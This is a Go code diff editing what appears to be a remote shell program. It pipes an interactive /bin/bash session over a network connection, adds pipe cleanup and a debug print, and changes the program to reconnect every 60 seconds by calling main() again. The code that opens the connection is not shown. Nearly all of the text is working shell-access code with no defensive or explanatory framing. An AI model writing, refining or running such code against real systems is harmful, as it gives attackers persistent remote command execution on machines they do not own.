@@ -15,18 +15,16 @@ func handle(conn net.Conn) {
 	// Explicitly calling /bin/sh and using -i for interactive mode
 	// so that we can use it for stdin and stdout.
 	// For Windows use exec.Command("cmd.exe").
-	//var buffer bytes.Buffer
 	cmd := exec.Command("/bin/bash", "-i")
 	rp, wp := io.Pipe()
+	defer rp.Close()
+	defer wp.Close()
+
 	cmd.Stdin = conn
 	cmd.Stdout = wp
 	go io.Copy(conn, rp)
-	//go io.Copy(&buffer, rp)
-	//if strings.Replace(buffer.String(), "\n", "", -1) == "exit" {
-	//	return
-	//}
+
 	cmd.Run()
-	return
 }
 
 func main() {
@@ -40,8 +38,10 @@ func main() {
 	}
 
 	handle(conn)
+	fmt.Println("donee")
+	time.Sleep(time.Second * 5)
 	conn.Close()
 
 	time.Sleep(time.Second * 60)
-	go main()
+	main()
 }
